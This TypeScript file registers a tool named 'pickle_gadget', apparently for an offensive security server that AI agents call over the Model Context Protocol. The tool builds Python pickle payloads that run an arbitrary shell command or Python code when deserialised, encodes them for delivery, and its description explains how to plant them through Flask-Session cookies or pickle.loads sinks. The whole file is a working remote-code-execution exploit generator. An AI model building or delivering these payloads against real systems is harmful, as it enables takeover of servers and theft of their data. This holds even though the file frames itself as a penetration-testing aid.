import { z } from 'zod'

import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'

import { ok, err, errorMessage } from '../utils'

// Python pickle RCE payload generator. When a target unpickles attacker data
// (Flask-Session with pickle serializer, a `pickle.loads` on a cookie/param,
// PyYAML unsafe load, etc.), a crafted pickle runs an arbitrary command on
// load via the __reduce__ / REDUCE opcode. rever can already DELIVER bytes
// (replay_request with a crafted cookie/body); what was missing is building the
// payload. This emits the classic os.system(cmd) pickle and encodes it for the
// delivery channel (base64 / hex / url / latin1 raw). Pure + testable: the
// opcode stream is deterministic.

/** SHORT_BINSTRING (<=255) or BINSTRING push of raw bytes. */
function pushString(buf: Buffer): Buffer {
  if (buf.length <= 0xff) {
    return Buffer.concat([Buffer.from([0x55]), Buffer.from([buf.length]), buf]) // 'U' len byte
  }
  const len = Buffer.alloc(4)
  len.writeUInt32LE(buf.length, 0)
  return Buffer.concat([Buffer.from([0x54]), len, buf]) // 'T' 4-byte LE
}

/**
 * pickle that runs `os.system(command)` on load:
 *   PROTO2, GLOBAL os.system, MARK, <command>, TUPLE, REDUCE, STOP
 * `callable` lets you swap os.system for e.g. builtins.exec (then command is
 * Python source). Default os.system = a shell command.
 */
export function buildPicklePayload(command: string, callable = 'os\nsystem'): Buffer {
  const proto = Buffer.from([0x80, 0x02]) // PROTO 2
  const global = Buffer.concat([Buffer.from('c'), Buffer.from(`${callable}\n`)]) // GLOBAL module\nname\n
  const mark = Buffer.from('(')
  const arg = pushString(Buffer.from(command, 'utf8'))
  const tail = Buffer.from('tR.') // TUPLE, REDUCE, STOP
  return Buffer.concat([proto, global, mark, arg, tail])
}

export type PickleEncoding = 'base64' | 'hex' | 'url' | 'latin1'

export function encodePayload(buf: Buffer, encoding: PickleEncoding): string {
  switch (encoding) {
    case 'base64':
      return buf.toString('base64')
    case 'hex':
      return buf.toString('hex')
    case 'latin1':
      return buf.toString('latin1')
    case 'url':
      return encodeURIComponent(buf.toString('latin1'))
  }
}

export function registerPickleGadgetTools(mcp: McpServer) {
  mcp.registerTool(
    'pickle_gadget',
    {
      description:
        'Build a Python pickle payload that runs a shell command when the target unpickles it (RCE via the __reduce__ opcode). Use against insecure-deserialization sinks: Flask-Session with the pickle serializer (session stored in memcached/redis/filesystem, keyed by the cookie SID — deliver via the session cookie), a param/cookie passed to pickle.loads, etc. rever delivers the bytes with replay_request (crafted cookie/body); this generates them. Returns the payload in base64/hex/url/latin1 so you can paste it into the delivery channel. callable defaults to os.system (command is a shell line); set it to "builtins\\nexec" to run Python source instead. For a confirmable (non-destructive) test, run a command that makes an observable out-of-band callback or writes a known marker.',
      inputSchema: {
        command: z.string().describe('Shell command to execute on unpickle (or Python source if callable is builtins.exec)'),
        encoding: z.enum(['base64', 'hex', 'url', 'latin1']).optional().describe('Output encoding (default base64)'),
        callable: z
          .string()
          .optional()
          .describe('GLOBAL to call, as "module\\nname" (default "os\\nsystem"); e.g. "builtins\\nexec" for Python source')
      }
    },
    async ({ command, encoding, callable }) => {
      try {
        const buf = buildPicklePayload(command, callable ?? 'os\nsystem')
        const enc = encoding ?? 'base64'
        return ok(
          JSON.stringify(
            {
              encoding: enc,
              payload: encodePayload(buf, enc),
              bytes: buf.length,
              note:
                'Unpickling this runs the command. Deliver via the sink: Flask-Session pickle → set the session cookie to a value that lands this in the store the SID keys. Confirm with an out-of-band callback or a written marker, not a blind command.'
            },
            null,
            2
          )
        )
      } catch (e) {
        return err(errorMessage(e))
      }
    }
  )
}
